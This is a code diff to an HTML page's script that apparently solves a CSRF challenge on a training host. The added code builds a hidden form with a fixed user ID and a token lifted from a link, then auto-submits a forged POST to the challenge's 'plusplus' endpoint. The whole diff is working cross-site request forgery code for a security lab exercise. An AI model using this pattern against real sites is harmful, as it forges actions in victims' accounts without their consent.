@@ -18,18 +18,29 @@
                 var csrf = href.split("=")[1];
                 //console.log("The header is: " + csrfText);
                 
-                var form = document.getElementById("csrf");
-                addCsrfToForm(form, csrf);
-                form.submit();
+                //var form = document.getElementById("csrf");
+                //addCsrfToForm(form, csrf);
+                //form.submit();
+                createForm('fcab4e7dfbe01ce4e3904b97febe6a6a184302c3', csrf);
             })();
             
-            function addCsrfToForm(form, value) {
+            function addInputToForm(form, name, value) {
                 // Create a hidden input element, and append it to the form
                 var input = document.createElement('input');
                 input.type = 'hidden';
-                input.name = 'csrfToken';
+                input.name = name;
                 input.value = value;
                 form.appendChild(input);
+            }
+            
+            function createForm(id, csrf) {
+                var form = document.createElement('form');
+                form.action = 'https://shepherd.waratek.lan/user/csrfchallengethree/plusplus';
+                form.method = 'POST';
+                addInputToForm(form, 'userId', id);
+                addInputToForm(form, 'csrfToken', csrf);
+                document.appendChild(form);
+                form.submit();
             }
         </script>
     </body>
